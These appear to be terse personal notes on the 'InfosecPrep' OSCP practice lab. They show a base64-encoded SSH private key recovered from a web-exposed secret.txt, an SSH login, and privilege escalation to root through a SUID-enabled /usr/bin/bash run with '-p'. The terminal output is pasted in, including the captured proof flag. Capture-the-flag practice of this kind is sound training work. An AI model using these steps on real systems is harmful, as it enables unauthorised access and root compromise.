参考教程  
[https://medium.com/@anytimehack/infosec-prep-oscp-vulnhub-proving-grounds-ctf-lab-walkthrough-d0236cd2c84f](https://medium.com/@anytimehack/infosec-prep-oscp-vulnhub-proving-grounds-ctf-lab-walkthrough-d0236cd2c84f)
    
[http://192.168.212.89//secret.txt](http://192.168.212.89//secret.txt)
 
cat secret.txt | base64 -d \> id_rsa  
chmod 600 id_rsa
 
/usr/bin/bash -p  
cat proof.txt
       
[http://192.168.212.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.212.89%2Fwp-admin%2F&reauth=1](http://192.168.212.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.212.89%2Fwp-admin%2F&reauth=1)
 
┌──(kali㉿kali)-[~/Desktop/pg02/InfosecPrep]  
└─$ ssh oscp@192.168.212.89 -i id_rsa2  
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
 
- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com)  
- Management: [https://landscape.canonical.com](https://landscape.canonical.com)  
- Support: [https://ubuntu.com/advantage](https://ubuntu.com/advantage)
 
System information disabled due to load higher than 1.0
   

318 updates can be installed immediately.  
201 of these updates are security updates.  
To see these additional updates run: apt list --upgradable
   

*** System restart required ***
 
The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.
 
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.
 
-bash-5.0$ ls  
ip local.txt  
-bash-5.0$ cat local.txt  
s  
-bash-5.0$
   

tiquan  
-bash-5.0$  
-bash-5.0$ ls -l /usr/bin/bash  
-rwsr-sr-x 1 root root 1183448 Feb 25 2020 /usr/bin/bash  
-bash-5.0$ /usr/bin/bash -p  
bash-5.0# whoami  
root  
bash-5.0# cd /root  
bash-5.0# ls  
fix-wordpress flag.txt proof.txt snap  
bash-5.0# cat proof.txt  
999f834a1013787b9f404df8089bdcb2  
bash-5.0#